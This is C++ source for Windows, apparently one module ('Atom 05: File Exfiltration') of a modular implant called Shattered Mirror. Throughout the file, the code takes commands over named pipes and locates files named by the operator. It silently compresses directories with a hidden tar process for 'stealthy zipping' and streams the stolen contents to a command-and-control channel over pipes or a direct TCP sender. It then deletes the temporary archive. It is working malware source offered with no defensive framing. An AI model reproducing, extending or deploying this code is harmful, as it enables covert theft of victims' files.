/*=============================================================================
 * Shattered Mirror v1 — Atom 05: File Exfiltration
 * OPTION B: Dual pipes – receives commands on command pipe,
 *            sends reports and chunked file data on report pipe.
 *===========================================================================*/

#define WIN32_LEAN_AND_MEAN
#include "Atom_05_Exfil.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <bcrypt.h>
#include <cstdarg>
#include <cstdio>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#include "../Orchestrator/TurboSend.h"
#include <cstring>
#include <string>

#pragma comment(lib, "bcrypt.lib")

#define CHUNK_SIZE 4096
#define MAX_RETRIES 5

typedef struct _EXFIL_HEADER {
  DWORD dwSequence;
  DWORD dwChunkLen;
  BYTE IV[12];
  BYTE Tag[16];
} EXFIL_HEADER;

static void ExfilDebug(const char *format, ...) {
  if (!Config::LOGGING_ENABLED) return;
  char buf[512];
  va_list args;
  va_start(args, format);
  vsnprintf(buf, sizeof(buf), format, args);
  va_end(args);
  FILE *f = fopen("log\\exfil_debug.txt", "a");
  if (f) {
    fprintf(f, "%s\n", buf);
    fclose(f);
  }
  printf("%s\n", buf);
}

static void SendErrorReport(HANDLE hReportPipe, const char *errorMsg,
                            BYTE *sessionKey, DWORD dwAtomId) {
  IPC_MESSAGE metaMsg = {0};
  metaMsg.dwSignature = 0x534D4952;
  metaMsg.CommandId = CMD_FORWARD_REPORT;
  metaMsg.AtomId = dwAtomId;
  metaMsg.dwPayloadLen = (DWORD)strlen(errorMsg);
  memcpy(metaMsg.Payload, errorMsg, metaMsg.dwPayloadLen);
  IPC_SendMessage(hReportPipe, &metaMsg, sessionKey, 16);
  ExfilDebug("Sent error: %s", errorMsg);
}

BOOL AesGcmEncrypt(const BYTE *pKey, const BYTE *pIv, const BYTE *pPlaintext,
                   DWORD dwPlainLen, BYTE *pCiphertext, BYTE *pTag) {
  BCRYPT_ALG_HANDLE hAlg = NULL;
  BCRYPT_KEY_HANDLE hKey = NULL;
  NTSTATUS status;

  status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
  if (!NT_SUCCESS(status))
    return FALSE;

  status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                             (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                             sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
  if (!NT_SUCCESS(status)) {
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return FALSE;
  }

  status =
      BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)pKey, 32, 0);
  if (!NT_SUCCESS(status)) {
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return FALSE;
  }

  BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
  BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
  authInfo.pbNonce = (PUCHAR)pIv;
  authInfo.cbNonce = 12;
  authInfo.pbTag = pTag;
  authInfo.cbTag = 16;

  DWORD cbResult = 0;
  status = BCryptEncrypt(hKey, (PUCHAR)pPlaintext, dwPlainLen, &authInfo, NULL,
                         0, pCiphertext, dwPlainLen, &cbResult, 0);

  BCryptDestroyKey(hKey);
  BCryptCloseAlgorithmProvider(hAlg, 0);
  return NT_SUCCESS(status);
}

static void GenerateRandomIV(BYTE *iv, DWORD ivLen) {
  BCRYPT_ALG_HANDLE hAlg = NULL;
  BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RNG_ALGORITHM, NULL, 0);
  if (hAlg) {
    BCryptGenRandom(hAlg, iv, ivLen, 0);
    BCryptCloseAlgorithmProvider(hAlg, 0);
  } else {
    for (DWORD i = 0; i < ivLen; i++)
      iv[i] = (BYTE)(GetTickCount() + i);
  }
}

static BOOL WaitForAck(HANDLE hCmdPipe, DWORD expectedSeq, BYTE *sessionKey) {
  IPC_MESSAGE inMsg;
  DWORD startTick = GetTickCount();
  while ((GetTickCount() - startTick) < 10000) {
    DWORD dwAvail = 0;
    if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
      if (IPC_ReceiveMessage(hCmdPipe, &inMsg, sessionKey, 16)) {
        if (inMsg.CommandId == CMD_EXECUTE) {
          std::string payload((char *)inMsg.Payload, inMsg.dwPayloadLen);
          if (payload.find("ACK:") == 0) {
            DWORD ackSeq = atoi(payload.c_str() + 4);
            if (ackSeq == expectedSeq)
              return TRUE;
          }
        }
      }
    }
    Sleep(100);
  }
  return FALSE;
}

DWORD WINAPI ExfiltrationAtomMain(LPVOID lpParam) {
  ExfilDebug("=== Atom 05 RAW PIPE VERSION ===");

  DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;

  // 1. Connect to command pipe (receive commands and ACKs)
  HANDLE hCmdPipe = IPC_ConnectToCommandPipe(dwAtomId);
  if (!hCmdPipe) {
    ExfilDebug("[Atom 5] FATAL: IPC_ConnectToCommandPipe failed. Error: %lu",
               GetLastError());
    return 1;
  }
  ExfilDebug("[Atom 5] Connected to command pipe. Handle: %p", hCmdPipe);

  // 2. Connect to report pipe (send reports and file chunks)
  HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
  if (!hReportPipe) {
    ExfilDebug("[Atom 5] FATAL: IPC_ConnectToReportPipe failed. Error: %lu",
               GetLastError());
    CloseHandle(hCmdPipe);
    return 1;
  }
  ExfilDebug("[Atom 5] Connected to report pipe. Handle: %p", hReportPipe);

  BYTE SharedSessionKey[16];
  memcpy(SharedSessionKey, Config::PSK_ID, 16);

  BYTE AesExfilKey[32];
  const char *keyMaterial = "MySuperSecretAes256KeyForExfil!!";
  memcpy(AesExfilKey, keyMaterial, 32);

  // Send CMD_READY on report pipe
  if (hReportPipe) {
    IPC_MESSAGE readyMsg = {0};
    readyMsg.dwSignature = 0x534D4952;
    readyMsg.CommandId = CMD_READY;
    readyMsg.AtomId = dwAtomId;
    readyMsg.dwPayloadLen = 0;
    IPC_SendMessage(hReportPipe, &readyMsg, SharedSessionKey, 16);
  }
  ExfilDebug("[Atom 5] CMD_READY sent.");

  ExfilDebug("[Atom 5] Waiting for CMD_EXECUTE...");

  while (TRUE) {
    DWORD dwAvail = 0;
    if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
      IPC_MESSAGE inMsg = {0};
      if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
        if (inMsg.CommandId == CMD_EXECUTE) {
          std::string filePath((char *)inMsg.Payload, inMsg.dwPayloadLen);
          BOOL bIsBale = (filePath.find("BALE_") == 0);
          if (bIsBale) filePath = filePath.substr(5);
          ExfilDebug("[Atom 5] Received CMD_EXECUTE: %s", filePath.c_str());

          // Validate path
          DWORD dwAttrib = GetFileAttributesA(filePath.c_str());
          if (dwAttrib == INVALID_FILE_ATTRIBUTES) {
              ExfilDebug("[Atom 5] Invalid file path: %s", filePath.c_str());
              continue;
          }

          if (dwAttrib & FILE_ATTRIBUTE_DIRECTORY) {
              if (inMsg.Payload[0] == 'Z') { // ZIP command
                  ExfilDebug("[Atom 5] Target is a directory. Zipping...");
                  char szTempZip[MAX_PATH];
                  sprintf_s(szTempZip, "C:\\Users\\Public\\%lu.tmp", GetTickCount());
                  
                  // Use native 'tar' (available in Win10/11) for stealthy zipping
                  char szCmd[1024];
                  sprintf_s(szCmd, "tar -acf \"%s\" -C \"%s\" .", szTempZip, filePath.c_str());
                  
                  STARTUPINFOA si = { sizeof(si) };
                  PROCESS_INFORMATION pi = { 0 };
                  if (CreateProcessA(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                      WaitForSingleObject(pi.hProcess, 60000); // 1 min timeout
                      CloseHandle(pi.hProcess);
                      CloseHandle(pi.hThread);
                      filePath = szTempZip; // Point exfil to the new zip
                      ExfilDebug("[Atom 5] Zip created: %s", szTempZip);
                  } else {
                      SendErrorReport(hReportPipe, "[EXFIL] ERROR: Failed to create zip.", SharedSessionKey, dwAtomId);
                      continue;
                  }
              } else {
                  ExfilDebug("[Atom 5] Path is a directory. Waiting for ZIP confirmation.");
                  if (bIsBale) {
                      SendErrorReport(hReportPipe, "[EXFIL] INFO: Target is a directory. Use /exfil ZIP:<path> to compress and send.", SharedSessionKey, dwAtomId);
                  } else {
                      SendErrorReport(hReportPipe, "[EXFIL_DIR_DETECTED]", SharedSessionKey, dwAtomId);
                  }
                  continue;
              }
          }

          HANDLE hFile =
              CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                          OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
          if (hFile == INVALID_HANDLE_VALUE) {
            DWORD err = GetLastError();
            ExfilDebug("[Atom 5] Cannot open file. Error: %lu", err);
            char errMsg[128];
            sprintf_s(errMsg, "[EXFIL] ERROR: Cannot open file (code %lu)",
                      err);
            SendErrorReport(hReportPipe, errMsg, SharedSessionKey, dwAtomId);
            continue;
          }

          DWORD dwStartChunk = 0;
          if (inMsg.Payload[0] == 'R') { // Format: RESUME:[CHUNK_NUM]:[PATH]
              char szPathBuf[MAX_PATH] = {0};
              if (sscanf_s((char*)inMsg.Payload, "RESUME:%lu:%s", &dwStartChunk, szPathBuf, (unsigned)_countof(szPathBuf)) >= 2) {
                  filePath = szPathBuf;
              }
          }

          DWORD dwFileSize = GetFileSize(hFile, NULL);
          DWORD totalChunks = (dwFileSize + CHUNK_SIZE - 1) / CHUNK_SIZE;
          ExfilDebug("[Atom 5] File size: %lu bytes, %lu chunks (Starting at %lu)", dwFileSize, totalChunks, dwStartChunk);

          if (bIsBale) {
              // === BALE PATH: Send plaintext file with chunked protocol ===
              // IPC pipe is already encrypted, no need for AES-GCM on top.
              // Uses 0x10/0x11/0x12 flags for Bale reassembly.

              // CHUNK START — send metadata
              {
                std::string meta = "name=" + filePath.substr(filePath.find_last_of("\\/") + 1) + 
                                   " size=" + std::to_string(dwFileSize);
                struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
                hdr.dwType = 3; // File
                hdr.dwFlags = 0x10; // BALE_FLAG_CHUNK_START
                hdr.dwPayloadLen = (DWORD)meta.length();
                IPC_MESSAGE startMsg = {0};
                startMsg.dwSignature = 0x534D4952;
                startMsg.CommandId = CMD_BALE_REPORT;
                startMsg.AtomId = dwAtomId;
                startMsg.dwPayloadLen = sizeof(hdr) + hdr.dwPayloadLen;
                memcpy(startMsg.Payload, &hdr, sizeof(hdr));
                memcpy(startMsg.Payload + sizeof(hdr), meta.c_str(), hdr.dwPayloadLen);
                IPC_SendMessage(hReportPipe, &startMsg, SharedSessionKey, 16);
                ExfilDebug("[Atom 5] BALE CHUNK_START sent: %s", meta.c_str());
              }

              // CHUNK DATA — stream plaintext file in IPC-sized pieces
              BYTE plainBuf[CHUNK_SIZE];
              DWORD dwBytesRead, dwTotalSent = 0;
              DWORD chunkMax = MAX_IPC_PAYLOAD_SIZE - sizeof(DWORD)*3 - 64;

              SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
              BOOL bStopExfil = FALSE;
              while (ReadFile(hFile, plainBuf, min(CHUNK_SIZE, chunkMax), &dwBytesRead, NULL) && dwBytesRead > 0 && !bStopExfil) {
                struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
                hdr.dwType = 3;
                hdr.dwFlags = 0x11; // BALE_FLAG_CHUNK_DATA
                hdr.dwPayloadLen = dwBytesRead;

                IPC_MESSAGE chunkMsg = {0};
                chunkMsg.dwSignature = 0x534D4952;
                chunkMsg.CommandId = CMD_BALE_REPORT;
                chunkMsg.AtomId = dwAtomId;
                chunkMsg.dwPayloadLen = sizeof(hdr) + dwBytesRead;
                memcpy(chunkMsg.Payload, &hdr, sizeof(hdr));
                memcpy(chunkMsg.Payload + sizeof(hdr), plainBuf, dwBytesRead);
                IPC_SendMessage(hReportPipe, &chunkMsg, SharedSessionKey, 16);
                dwTotalSent += dwBytesRead;

                // Check for stop command every chunk
                DWORD dwStopAvail = 0;
                if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwStopAvail, NULL) && dwStopAvail > 0) {
                    IPC_MESSAGE stopMsg = {0};
                    if (IPC_ReceiveMessage(hCmdPipe, &stopMsg, SharedSessionKey, 16)) {
                        std::string stopCmd((char*)stopMsg.Payload, stopMsg.dwPayloadLen);
                        if (stopCmd == "TERMINATE" || stopCmd == "BALE_STOP" || stopCmd.find("/stop_live") != std::string::npos || 
                            stopMsg.CommandId == CMD_TERMINATE || stopMsg.CommandId == CMD_STOP_ALL) {
                            ExfilDebug("[Atom 5] Exfiltration ABORTED by command.");
                            bStopExfil = TRUE;
                        }
                    }
                }
              }

              // CHUNK END
              {
                std::string done = "DONE:" + std::to_string(dwTotalSent);
                struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
                hdr.dwType = 3;
                hdr.dwFlags = 0x12; // BALE_FLAG_CHUNK_END
                hdr.dwPayloadLen = (DWORD)done.length();
                IPC_MESSAGE endMsg = {0};
                endMsg.dwSignature = 0x534D4952;
                endMsg.CommandId = CMD_BALE_REPORT;
                endMsg.AtomId = dwAtomId;
                endMsg.dwPayloadLen = sizeof(hdr) + hdr.dwPayloadLen;
                memcpy(endMsg.Payload, &hdr, sizeof(hdr));
                memcpy(endMsg.Payload + sizeof(hdr), done.c_str(), hdr.dwPayloadLen);
                IPC_SendMessage(hReportPipe, &endMsg, SharedSessionKey, 16);
              }

              CloseHandle(hFile);
              ExfilDebug("[Atom 5] BALE transfer complete. Sent %lu bytes plaintext.", dwTotalSent);

          } else {
              // === C2 PATH: Turbo TCP direct send ===
              CloseHandle(hFile);
              ExfilDebug("[Atom 5] Starting Turbo TCP EXFIL for %s", filePath.c_str());
              
              if (Turbo::SendFile("EXFIL", filePath.c_str())) {
                  ExfilDebug("[Atom 5] Transfer finished via Turbo TCP.");
                  
                  // Notify Orchestrator of success
                  std::string done = "DONE:" + std::to_string(dwFileSize);
                  IPC_MESSAGE doneMsg = {0};
                  doneMsg.dwSignature = 0x534D4952;
                  doneMsg.CommandId = CMD_REPORT;
                  doneMsg.AtomId = dwAtomId;
                  doneMsg.dwPayloadLen = (DWORD)done.length();
                  memcpy(doneMsg.Payload, done.c_str(), done.length());
                  IPC_SendMessage(hReportPipe, &doneMsg, SharedSessionKey, 16);
              } else {
                  ExfilDebug("[Atom 5] Transfer failed via Turbo TCP.");
                  SendErrorReport(hReportPipe, "[EXFIL] ERROR: Turbo TCP transfer failed.", SharedSessionKey, dwAtomId);
              }
          }

          // Cleanup temp zip if we made one
          if (filePath.find("C:\\Users\\Public\\") == 0 && filePath.find(".tmp") != std::string::npos) {
              DeleteFileA(filePath.c_str());
              ExfilDebug("[Atom 5] Cleaned up temp zip.");
          }
        } else if (inMsg.CommandId == CMD_TERMINATE) {
          ExfilDebug("[Atom 5] Received CMD_TERMINATE. Exiting.");
          break;
        }
      }
    } else {
      DWORD err = GetLastError();
      if (err == ERROR_BROKEN_PIPE)
        break;
    }
    Sleep(100);
  }

  CloseHandle(hCmdPipe);
  CloseHandle(hReportPipe);
  return 0;
}